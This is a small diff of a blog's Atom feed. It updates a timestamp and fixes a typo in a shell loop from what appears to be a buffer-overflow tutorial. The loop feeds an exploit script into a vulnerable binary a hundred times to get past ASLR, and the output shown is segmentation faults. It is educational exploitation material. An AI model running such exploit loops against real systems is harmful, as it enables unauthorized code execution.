@@ -3,7 +3,7 @@
     <title><![CDATA[devGiants]]></title>
     <link href="/atom.xml" rel="self"/>
     <link href="/"/>
-    <updated>2021-09-13T14:18:16+02:00</updated>
+    <updated>2021-09-14T17:30:50+02:00</updated>
     <id>/</id>
         <generator uri="http://sculpin.io/">Sculpin</generator>
             <entry>
@@ -669,7 +669,7 @@ print pad + EIP + NOP + shellcode
 
 <p>First try on VM:</p>
 
-<pre><code>clapton@debian:~$ for i in {0..100}; do ./input $(/tmp/exploit_aslr.py): done
+<pre><code>clapton@debian:~$ for i in {0..100}; do ./input $(/tmp/exploit_aslr.py); done
 Segmentation fault
 Segmentation fault
 Segmentation fault
